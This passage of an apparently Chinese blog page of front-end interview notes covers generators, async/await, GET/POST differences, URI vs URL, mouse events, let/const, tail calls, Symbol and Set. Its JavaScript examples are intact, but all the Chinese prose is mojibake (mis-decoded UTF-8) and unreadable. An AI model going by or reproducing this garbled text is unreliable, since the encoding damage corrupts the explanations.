class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> readFile = <span class="function"><span class="keyword">function</span> (<span class="params">fileName</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    fs.readFile(fileName, <span class="function"><span class="keyword">function</span>(<span class="params">error, data</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (error) <span class="keyword">return</span> reject(error);</span><br><span class="line">      resolve(data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> gen = <span class="function"><span class="keyword">function</span>* (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> f1 = <span class="keyword">yield</span> readFile(<span class="string">&#x27;/etc/fstab&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> f2 = <span class="keyword">yield</span> readFile(<span class="string">&#x27;/etc/shells&#x27;</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(f1.toString());</span><br><span class="line">  <span class="built_in">console</span>.log(f2.toString());</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸Šé¢ä»£ç çš„å‡½æ•°genå¯ä»¥å†™æˆasyncå‡½æ•°ï¼Œå°±æ˜¯ä¸‹é¢è¿™æ ·ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> asyncReadFile = <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> f1 = <span class="keyword">await</span> readFile(<span class="string">&#x27;/etc/fstab&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> f2 = <span class="keyword">await</span> readFile(<span class="string">&#x27;/etc/shells&#x27;</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(f1.toString());</span><br><span class="line">  <span class="built_in">console</span>.log(f2.toString());</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h2 id="async-await"><a href="#async-await" class="headerlink" title="async / await"></a>async / await</h2><p><strong>ä»¥åŒæ­¥æ–¹å¼æ‰§è¡Œå¼‚æ­¥æ“ä½œã€‚</strong><code>async</code> å°±æ˜¯å°†å‡½æ•°è¿”å›å€¼ä½¿ç”¨ <code>Promise.resolve()</code> åŒ…è£¹äº†ä¸‹ï¼Œ<code>await</code> å°±æ˜¯ <code>generator</code> åŠ ä¸Š <code>Promise</code> çš„è¯­æ³•ç³–ï¼Œä¸”å†…éƒ¨å®ç°äº†è‡ªåŠ¨æ‰§è¡Œ <code>generator</code>ã€‚</p><p>è€ƒè™‘ä»¥ä¸‹æƒ…æ™¯ï¼šæ¥å£ä¸€ï¼Œè¯·æ±‚åˆ°æ•°æ®ä¸€ï¼Œè€Œæ•°æ®ä¸€è¢«å½“åšè¯·æ±‚äºŒçš„å‚æ•°å»è¯·æ±‚æ•°æ®äºŒï¼Œç”¨Promiseå®ç°ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// æ¨¡æ‹Ÿç¬¬ä¸€æ¬¡è¯·æ±‚</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      resolve(<span class="number">5</span>)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// æ¨¡æ‹Ÿç¬¬äºŒæ¬¡è¯·æ±‚</span></span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// æ‹¿ç¬¬ä¸€æ¬¡è¯·æ±‚çš„æ•°æ®å»ä¹˜10ï¼Œå½“åšç¬¬äºŒæ¬¡è¯·æ±‚çš„æ•°æ®</span></span><br><span class="line">        resolve(res * <span class="number">10</span>)</span><br><span class="line">      &#125;, <span class="number">2000</span>)</span><br><span class="line">    &#125;).then(<span class="function"><span class="params">sres</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(sres)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line">fn() <span class="comment">// 1 + 2 = 3 3ç§’åè¾“å‡º 50</span></span><br></pre></td></tr></table></figure><p>async/await å®ç°ï¼Œæ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li>await åªèƒ½åœ¨ async å‡½æ•°é‡Œä½¿ç”¨</li><li>await åé¢æœ€å¥½æ¥ Promiseï¼Œå¦‚æœåé¢æ¥çš„æ˜¯æ™®é€šå‡½æ•°åˆ™ä¼šç›´æ¥æ‰§è¡Œ</li><li>async å‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ª Promise</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      resolve(<span class="number">5</span>)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn2</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      resolve(data * <span class="number">10</span>)</span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">req</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// åŒæ­¥æ–¹å¼æ‰§è¡Œå¼‚æ­¥ï¼Œåƒæ’é˜Ÿä¸€æ ·</span></span><br><span class="line">  <span class="keyword">const</span> data1 = <span class="keyword">await</span> fn1() <span class="comment">// ç­‰å¾…1ç§’åè¿”å›æ•°æ®å†å¾€ä¸‹æ‰§è¡Œ</span></span><br><span class="line">  <span class="keyword">const</span> data2 = <span class="keyword">await</span> fn2(data1) <span class="comment">// æ‹¿data1å»è¯·æ±‚2ç§’åï¼Œå¾€ä¸‹èµ°</span></span><br><span class="line">  <span class="built_in">console</span>.log(data2) <span class="comment">// æ€»å…±3ç§’å è¾“å‡º 50</span></span><br><span class="line">&#125;</span><br><span class="line">req()</span><br></pre></td></tr></table></figure><h2 id="Generator"><a href="#Generator" class="headerlink" title="Generator"></a>Generator</h2><p>Generator æœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯å¯ä»¥æ§åˆ¶å‡½æ•°çš„æ‰§è¡Œã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> *<span class="title">foo</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> y = <span class="number">2</span> * (<span class="keyword">yield</span> (x + <span class="number">1</span>))</span><br><span class="line">  <span class="keyword">let</span> z = <span class="keyword">yield</span> (y / <span class="number">3</span>)</span><br><span class="line">  <span class="keyword">return</span> (x + y + z)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> it = foo(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">console</span>.log(it.next())   <span class="comment">// =&gt; &#123;value: 6, done: false&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(it.next(<span class="number">12</span>)) <span class="comment">// =&gt; &#123;value: 8, done: false&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(it.next(<span class="number">13</span>)) <span class="comment">// =&gt; &#123;value: 42, done: true&#125;</span></span><br></pre></td></tr></table></figure><ul><li>é¦–å…ˆ <code>Generator</code> å‡½æ•°è°ƒç”¨å’Œæ™®é€šå‡½æ•°ä¸åŒï¼Œå®ƒä¼šè¿”å›ä¸€ä¸ªè¿­ä»£å™¨</li><li>å½“æ‰§è¡Œç¬¬ä¸€æ¬¡ <code>next</code> æ—¶ï¼Œä¼ å‚ä¼šè¢«å¿½ç•¥ï¼Œå¹¶ä¸”å‡½æ•°æš‚åœåœ¨ <code>yield (x + 1)</code> å¤„ï¼Œæ‰€ä»¥è¿”å› <code>5 + 1 = 6</code></li><li>å½“æ‰§è¡Œç¬¬äºŒæ¬¡ <code>next</code> æ—¶ï¼Œä¼ å…¥çš„å‚æ•°ç­‰äºä¸Šä¸€ä¸ª <code>yield</code> çš„è¿”å›å€¼ï¼Œå¦‚æœä½ ä¸ä¼ å‚ï¼Œ<code>yield</code> æ°¸è¿œè¿”å› <code>undefined</code>ã€‚æ­¤æ—¶ <code>let y = 2 * 12</code>ï¼Œæ‰€ä»¥ç¬¬äºŒä¸ª <code>yield</code> ç­‰äº <code>2 * 12 / 3 = 8</code></li><li>å½“æ‰§è¡Œç¬¬ä¸‰æ¬¡ <code>next</code> æ—¶ï¼Œä¼ å…¥çš„å‚æ•°ä¼šä¼ é€’ç»™ <code>z</code>ï¼Œæ‰€ä»¥ <code>z = 13, x = 5, y = 24</code>ï¼Œç›¸åŠ ç­‰äº <code>42</code></li></ul><h2 id="async-await-ä¸-Generator-çš„åŒºåˆ«ï¼Ÿ"><a href="#async-await-ä¸-Generator-çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="async / await ä¸ Generator çš„åŒºåˆ«ï¼Ÿ"></a>async / await ä¸ Generator çš„åŒºåˆ«ï¼Ÿ</h2><p>async å‡½æ•°å¯¹ Generator å‡½æ•°çš„æ”¹è¿›ï¼Œä½“ç°åœ¨ä»¥ä¸‹å››ç‚¹:</p><p>ï¼ˆ1ï¼‰å†…ç½®æ‰§è¡Œå™¨ã€‚Generator å‡½æ•°çš„æ‰§è¡Œå¿…é¡»é æ‰§è¡Œå™¨ï¼Œæ‰€ä»¥æ‰æœ‰äº† co æ¨¡å—ï¼Œè€Œ async å‡½æ•°è‡ªå¸¦æ‰§è¡Œå™¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œasync å‡½æ•°çš„æ‰§è¡Œä¸æ™®é€šå‡½æ•°ä¸€æ¨¡ä¸€æ ·ï¼Œåªè¦ä¸€è¡Œã€‚</p><p>ï¼ˆ2ï¼‰æ›´å¥½çš„è¯­ä¹‰ã€‚async å’Œ await ï¼Œæ¯”èµ· * å’Œ yield ï¼Œè¯­ä¹‰æ›´æ¸…æ¥šäº†ã€‚ async è¡¨ç¤ºå‡½æ•°é‡Œæœ‰å¼‚æ­¥æ“ä½œï¼Œawait è¡¨ç¤ºç´§è·Ÿåœ¨åé¢çš„è¡¨è¾¾å¼éœ€è¦ç­‰å¾…ç»“æœã€‚</p><p>ï¼ˆ3ï¼‰æ›´å¹¿çš„é€‚ç”¨æ€§ã€‚co æ¨¡å—çº¦å®šï¼Œyield å‘½ä»¤åé¢åªèƒ½æ˜¯ Thunk å‡½æ•°æˆ– Promise å¯¹è±¡ï¼Œè€Œ async å‡½æ•°çš„ await å‘½ä»¤åé¢ï¼Œå¯ä»¥æ˜¯ Promise å¯¹è±¡å’ŒåŸå§‹ç±»å‹çš„å€¼ï¼ˆæ•°å€¼ã€å­—ç¬¦ä¸²å’Œå¸ƒå°”å€¼ï¼Œä½†è¿™æ—¶ä¼šè‡ªåŠ¨è½¬æˆç«‹å³ resolved çš„ Promise å¯¹è±¡ï¼‰ã€‚</p><p>ï¼ˆ4ï¼‰è¿”å›å€¼æ˜¯ Promiseã€‚async å‡½æ•°çš„è¿”å›å€¼æ˜¯ Promise å¯¹è±¡ï¼Œè¿™æ¯” Generator å‡½æ•°çš„è¿”å›å€¼æ˜¯ Iterator å¯¹è±¡æ–¹ä¾¿å¤šäº†ã€‚å¯ä»¥ç”¨thenæ–¹æ³•æŒ‡å®šä¸‹ä¸€æ­¥çš„æ“ä½œã€‚è¿›ä¸€æ­¥è¯´ï¼Œasync å‡½æ•°å®Œå…¨å¯ä»¥çœ‹ä½œå¤šä¸ªå¼‚æ­¥æ“ä½œï¼ŒåŒ…è£…æˆçš„ä¸€ä¸ª Promise å¯¹è±¡ï¼Œè€Œawaitå‘½ä»¤å°±æ˜¯å†…éƒ¨ then å‘½ä»¤çš„è¯­æ³•ç³–ã€‚</p><p>async å‡½æ•°è¿”å›ä¸€ä¸ª Promise å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨ then æ–¹æ³•æ·»åŠ å›è°ƒå‡½æ•°ã€‚å½“å‡½æ•°æ‰§è¡Œçš„æ—¶å€™ï¼Œä¸€æ—¦é‡åˆ° await å°±ä¼šå…ˆè¿”å›ï¼Œç­‰åˆ°å¼‚æ­¥æ“ä½œå®Œæˆï¼Œå†æ¥ç€æ‰§è¡Œå‡½æ•°ä½“å†…åé¢çš„è¯­å¥ã€‚æœ‰ç©ºå¯ä»¥çœ‹ä¸€çœ‹ <a href="https://blog.csdn.net/a18792627168/article/details/106170485%E3%80%82">https://blog.csdn.net/a18792627168/article/details/106170485ã€‚</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">timeout</span>(<span class="params">ms</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(resolve, ms);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">asyncPrint</span>(<span class="params">value, ms</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">await</span> timeout(ms);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">asyncPrint(<span class="string">&#x27;hello world&#x27;</span>, <span class="number">50</span>);</span><br></pre></td></tr></table></figure><h2 id="Js-åŠ¨ç”»ä¸-CSS-åŠ¨ç”»åŒºåˆ«åŠç›¸åº”å®ç°"><a href="#Js-åŠ¨ç”»ä¸-CSS-åŠ¨ç”»åŒºåˆ«åŠç›¸åº”å®ç°" class="headerlink" title="Js åŠ¨ç”»ä¸ CSS åŠ¨ç”»åŒºåˆ«åŠç›¸åº”å®ç°"></a>Js åŠ¨ç”»ä¸ CSS åŠ¨ç”»åŒºåˆ«åŠç›¸åº”å®ç°</h2><p>CSS3 çš„åŠ¨ç”»çš„<strong>ä¼˜ç‚¹</strong>ï¼šåœ¨æ€§èƒ½ä¸Šä¼šç¨å¾®å¥½ä¸€äº›ï¼Œæµè§ˆå™¨ä¼šå¯¹ CSS3 çš„åŠ¨ç”»åšä¸€äº›ä¼˜åŒ–ã€‚ä»£ç ç›¸å¯¹ç®€å•ã€‚</p><p><strong>ç¼ºç‚¹</strong>ï¼šåœ¨åŠ¨ç”»æ§åˆ¶ä¸Šä¸å¤Ÿçµæ´»ã€‚å…¼å®¹æ€§ä¸å¥½ã€‚</p><p>JavaScript çš„åŠ¨ç”»<strong>ä¼˜ç‚¹</strong>ï¼šæ§åˆ¶èƒ½åŠ›å¾ˆå¼ºï¼Œå¯ä»¥å•å¸§çš„æ§åˆ¶ã€å˜æ¢ï¼ŒåŒæ—¶å†™å¾—å¥½å®Œå…¨å¯ä»¥å…¼å®¹ IE6ï¼Œå¹¶ä¸”åŠŸèƒ½å¼ºå¤§ã€‚</p><p>å¯¹äºä¸€äº›å¤æ‚æ§åˆ¶çš„åŠ¨ç”»ï¼Œä½¿ç”¨ javascript ä¼šæ¯”è¾ƒé è°±ã€‚è€Œåœ¨å®ç°ä¸€äº›å°çš„äº¤äº’åŠ¨æ•ˆçš„æ—¶å€™ï¼Œå°±å¤šè€ƒè™‘è€ƒè™‘ CSS å§ã€‚</p><h2 id="get-è¯·æ±‚ä¼ å‚é•¿åº¦çš„è¯¯åŒº"><a href="#get-è¯·æ±‚ä¼ å‚é•¿åº¦çš„è¯¯åŒº" class="headerlink" title="get è¯·æ±‚ä¼ å‚é•¿åº¦çš„è¯¯åŒº"></a>get è¯·æ±‚ä¼ å‚é•¿åº¦çš„è¯¯åŒº</h2><p>è¯¯åŒºï¼šæˆ‘ä»¬ç»å¸¸è¯´ get è¯·æ±‚å‚æ•°çš„å¤§å°å­˜åœ¨é™åˆ¶ï¼Œè€Œ post è¯·æ±‚çš„å‚æ•°å¤§å°æ˜¯æ— é™åˆ¶çš„ã€‚</p><p>å®é™…ä¸Š HTTP åè®®ä»æœªè§„å®š GET/POST çš„è¯·æ±‚é•¿åº¦é™åˆ¶æ˜¯å¤šå°‘ã€‚å¯¹ get è¯·æ±‚å‚æ•°çš„é™åˆ¶æ˜¯æ¥æºäºæµè§ˆå™¨æˆ– web æœåŠ¡å™¨ï¼Œæµè§ˆå™¨æˆ– web æœåŠ¡å™¨é™åˆ¶äº† url çš„é•¿åº¦ã€‚ä¸ºäº†æ˜ç¡®è¿™ä¸ªæ¦‚å¿µï¼Œæˆ‘ä»¬å¿…é¡»å†æ¬¡å¼ºè°ƒä¸‹é¢å‡ ç‚¹:</p><ul><li>HTTP åè®®æœªè§„å®š GET å’Œ POST çš„é•¿åº¦é™åˆ¶</li><li>GET çš„æœ€å¤§é•¿åº¦æ˜¾ç¤ºæ˜¯å› ä¸ºæµè§ˆå™¨å’Œ web æœåŠ¡å™¨é™åˆ¶äº† URI çš„é•¿åº¦</li><li>ä¸åŒçš„æµè§ˆå™¨å’Œ WEB æœåŠ¡å™¨ï¼Œé™åˆ¶çš„æœ€å¤§é•¿åº¦ä¸ä¸€æ ·</li><li>è¦æ”¯æŒ IEï¼Œåˆ™æœ€å¤§é•¿åº¦ä¸º 2083byteï¼Œè‹¥åªæ”¯æŒ Chromeï¼Œåˆ™æœ€å¤§é•¿åº¦ 8182byte</li></ul><h2 id="URL-å’Œ-URI-çš„åŒºåˆ«ï¼Ÿ"><a href="#URL-å’Œ-URI-çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="URL å’Œ URI çš„åŒºåˆ«ï¼Ÿ"></a>URL å’Œ URI çš„åŒºåˆ«ï¼Ÿ</h2><p><strong>URI</strong>: Uniform Resource Identifier      <strong>ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦</strong>ï¼Œç”¨å”¯ä¸€çš„æ ‡è¯†æ¥ç¡®å®šä¸€ä¸ªèµ„æºï¼Œå®ƒæ˜¯ä¸€ç§æŠ½è±¡çš„å®šä¹‰ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸ç®¡ä½¿ç”¨ä»€ä¹ˆæ–¹æ³•æ¥å®šä¹‰ï¼Œåªè¦èƒ½å”¯ä¸€çš„æ ‡è¯†ä¸€ä¸ªèµ„æºï¼Œå°±å¯ä»¥ç§°ä¸º URIã€‚<br><strong>URL</strong>: Uniform Resource Location        <strong>ç»Ÿä¸€èµ„æºå®šä½ç¬¦</strong>ï¼ŒURL å’Œ URN æ˜¯ URI çš„å­é›†ï¼ŒURL å¯ä»¥ç†è§£ä¸ºä½¿ç”¨åœ°å€æ¥æ ‡è¯†èµ„æºã€‚<br><strong>URN</strong>: Universal Resource Name          <strong>ç»Ÿä¸€èµ„æºåç§°</strong>ï¼ŒURN å¯ä»¥ç†è§£ä¸ºä½¿ç”¨åç§°æ¥æ ‡è¯†èµ„æºã€‚</p><h2 id="get-å’Œ-post-è¯·æ±‚åœ¨ç¼“å­˜æ–¹é¢çš„åŒºåˆ«"><a href="#get-å’Œ-post-è¯·æ±‚åœ¨ç¼“å­˜æ–¹é¢çš„åŒºåˆ«" class="headerlink" title="get å’Œ post è¯·æ±‚åœ¨ç¼“å­˜æ–¹é¢çš„åŒºåˆ«"></a>get å’Œ post è¯·æ±‚åœ¨ç¼“å­˜æ–¹é¢çš„åŒºåˆ«</h2><p>get è¯·æ±‚ç±»ä¼¼äºæŸ¥æ‰¾çš„è¿‡ç¨‹ï¼Œç”¨æˆ·è·å–æ•°æ®ï¼Œå¯ä»¥ä¸ç”¨æ¯æ¬¡éƒ½ä¸æ•°æ®åº“è¿æ¥ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ç¼“å­˜ã€‚</p><p>post åšçš„ä¸€èˆ¬æ˜¯ä¿®æ”¹å’Œåˆ é™¤çš„å·¥ä½œï¼Œæ‰€ä»¥å¿…é¡»ä¸æ•°æ®åº“äº¤äº’ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨ç¼“å­˜ã€‚</p><h2 id="mouseover-å’Œ-mouseenter-çš„åŒºåˆ«ï¼Ÿ"><a href="#mouseover-å’Œ-mouseenter-çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="mouseover å’Œ mouseenter çš„åŒºåˆ«ï¼Ÿ"></a>mouseover å’Œ mouseenter çš„åŒºåˆ«ï¼Ÿ</h2><p>å½“é¼ æ ‡ç§»åŠ¨åˆ°å…ƒç´ ä¸Šæ—¶å°±ä¼šè§¦å‘ mouseenter äº‹ä»¶ï¼Œç±»ä¼¼ mouseoverï¼Œå®ƒä»¬ä¸¤è€…ä¹‹é—´çš„å·®åˆ«æ˜¯ <strong>mouseenter ä¸ä¼šå†’æ³¡</strong>ã€‚</p><p>ç”±äº mouseenter ä¸æ”¯æŒäº‹ä»¶å†’æ³¡ï¼Œå¯¼è‡´åœ¨ä¸€ä¸ªå…ƒç´ çš„å­å…ƒç´ ä¸Šè¿›å…¥æˆ–ç¦»å¼€çš„æ—¶å€™ä¼šè§¦å‘å…¶ mouseover å’Œ mouseout äº‹ä»¶ï¼Œä½†æ˜¯å´ä¸ä¼šè§¦å‘ mouseenter å’Œ mouseleave äº‹ä»¶ã€‚</p><h2 id="let-å’Œ-const-çš„æ³¨æ„ç‚¹ï¼Ÿ"><a href="#let-å’Œ-const-çš„æ³¨æ„ç‚¹ï¼Ÿ" class="headerlink" title="let å’Œ const çš„æ³¨æ„ç‚¹ï¼Ÿ"></a>let å’Œ const çš„æ³¨æ„ç‚¹ï¼Ÿ</h2><ul><li>å£°æ˜çš„å˜é‡åªåœ¨å£°æ˜æ—¶çš„ä»£ç å—å†…æœ‰æ•ˆ</li><li>ä¸å­˜åœ¨å£°æ˜æå‡</li><li>å­˜åœ¨æš‚æ—¶æ€§æ­»åŒºï¼Œå¦‚æœåœ¨å˜é‡å£°æ˜å‰ä½¿ç”¨ï¼Œä¼šæŠ¥é”™</li><li>ä¸å…è®¸é‡å¤å£°æ˜ï¼Œé‡å¤å£°æ˜ä¼šæŠ¥é”™</li></ul><h2 id="ä»€ä¹ˆæ˜¯å°¾è°ƒç”¨ï¼Œæœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯å°¾è°ƒç”¨ï¼Œæœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯å°¾è°ƒç”¨ï¼Œæœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯å°¾è°ƒç”¨ï¼Œæœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿ</h2><p>å°¾è°ƒç”¨æŒ‡çš„æ˜¯å‡½æ•°çš„æœ€åä¸€æ­¥è°ƒç”¨å¦ä¸€ä¸ªå‡½æ•°ã€‚æˆ‘ä»¬ä»£ç æ‰§è¡Œæ˜¯åŸºäºæ‰§è¡Œæ ˆçš„ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬åœ¨ä¸€ä¸ªå‡½æ•°é‡Œè°ƒç”¨å¦ä¸€ä¸ªå‡½æ•°æ—¶ï¼Œæˆ‘ä»¬ä¼šä¿ç•™å½“å‰çš„æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œç„¶åå†æ–°å»ºå¦å¤–ä¸€ä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡åŠ å…¥æ ˆä¸­ã€‚</p><p>ä½¿ç”¨å°¾è°ƒç”¨çš„è¯ï¼Œå› ä¸ºå·²ç»æ˜¯å‡½æ•°çš„æœ€åä¸€æ­¥ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥<strong>ä¸å¿…å†ä¿ç•™å½“å‰çš„æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œä»è€ŒèŠ‚çœäº†å†…å­˜</strong>ï¼Œè¿™å°±æ˜¯å°¾è°ƒç”¨ä¼˜åŒ–ã€‚ä½†æ˜¯ ES6 çš„å°¾è°ƒç”¨ä¼˜åŒ–åªåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹å¼€å¯ï¼Œæ­£å¸¸æ¨¡å¼æ˜¯æ— æ•ˆçš„ã€‚</p><h2 id="Symbol-ç±»å‹çš„æ³¨æ„ç‚¹ï¼Ÿ"><a href="#Symbol-ç±»å‹çš„æ³¨æ„ç‚¹ï¼Ÿ" class="headerlink" title="Symbol ç±»å‹çš„æ³¨æ„ç‚¹ï¼Ÿ"></a>Symbol ç±»å‹çš„æ³¨æ„ç‚¹ï¼Ÿ</h2><ul><li>Symbol å‡½æ•°å‰<strong>ä¸èƒ½ä½¿ç”¨ new å‘½ä»¤</strong>ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚</li><li>Symbol å‡½æ•°å¯ä»¥æ¥å—<strong>ä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°</strong>ï¼Œè¡¨ç¤ºå¯¹ Symbol å®ä¾‹çš„æè¿°ï¼Œä¸»è¦æ˜¯ä¸ºäº†åœ¨æ§åˆ¶å°æ˜¾ç¤ºæˆ–è€…è½¬ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œæ¯”è¾ƒå®¹æ˜“åŒºåˆ†ã€‚</li><li>Symbol ä½œä¸ºå±æ€§åï¼Œè¯¥å±æ€§ä¸ä¼šå‡ºç°åœ¨ forâ€¦inã€forâ€¦of å¾ªç¯ä¸­ï¼Œä¹Ÿä¸ä¼šè¢« Object.keys()ã€Object.getOwnPropertyNames()ã€JSON.stringify() è¿”å›ã€‚</li><li>Object.getOwnPropertySymbols æ–¹æ³•è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œæˆå‘˜æ˜¯å½“å‰å¯¹è±¡çš„æ‰€æœ‰ç”¨ä½œå±æ€§åçš„ Symbol å€¼ã€‚</li><li>Symbol.for æ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œç„¶åæœç´¢æœ‰æ²¡æœ‰ä»¥è¯¥å‚æ•°ä½œä¸ºåç§°çš„ Symbol å€¼ã€‚å¦‚æœæœ‰å°±è¿”å›è¿™ä¸ª Symbol å€¼ï¼Œå¦åˆ™æ–°å»ºå¹¶è¿”å›ä¸€ä¸ªä»¥è¯¥å­—ç¬¦ä¸²ä¸ºåç§°çš„ Symbol å€¼ã€‚</li><li>Symbol.keyFor æ–¹æ³•è¿”å›ä¸€ä¸ªå·²ç™»è®°çš„ Symbol ç±»å‹å€¼çš„ keyã€‚</li></ul><h2 id="Set-å’Œ-WeakSet-ç»“æ„ï¼Ÿ"><a href="#Set-å’Œ-WeakSet-ç»“æ„ï¼Ÿ" class="headerlink" title="Set å’Œ WeakSet ç»“æ„ï¼Ÿ"></a>Set å’Œ WeakSet ç»“æ„ï¼Ÿ</h2><ul><li>ES6 æä¾›äº†æ–°çš„æ•°æ®ç»“æ„ Set ã€‚å®ƒç±»ä¼¼äºæ•°ç»„ï¼Œä½†æ˜¯æˆå‘˜çš„å€¼éƒ½æ˜¯<strong>å”¯ä¸€</strong>çš„ï¼Œæ²¡æœ‰é‡å¤ã€‚ï¼ˆå¯ä»¥å»é‡ NaN ï¼‰</li><li>WeakSet ç»“æ„ä¸ Set ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ä¸é‡å¤çš„å€¼çš„é›†åˆã€‚ä½†æ˜¯ <strong>WeakSet çš„æˆå‘˜åªèƒ½æ˜¯å¯¹è±¡</strong>ï¼Œè€Œä¸èƒ½æ˜¯å…¶ä»–ç±»å‹çš„å€¼ã€‚WeakSet ä¸­çš„å¯¹è±¡éƒ½æ˜¯å¼±å¼•ç”¨ï¼Œå³åƒåœ¾å›æ”¶æœºåˆ¶ä¸è€ƒè™‘ WeakSet å¯¹è¯¥å¯¹è±¡çš„å¼•ç”¨ï¼Œ</li></ul><h2 id="Map-å’Œ-WeakMap-ç»“æ„ï¼Ÿ"><a href="#Map-å’Œ-WeakMap-ç»“æ„ï¼Ÿ" class="headerlink" title="Map å’Œ WeakMap ç»“æ„ï¼Ÿ"></a>Map å’Œ WeakMap ç»“æ„ï¼Ÿ</h2><ul><li>Map 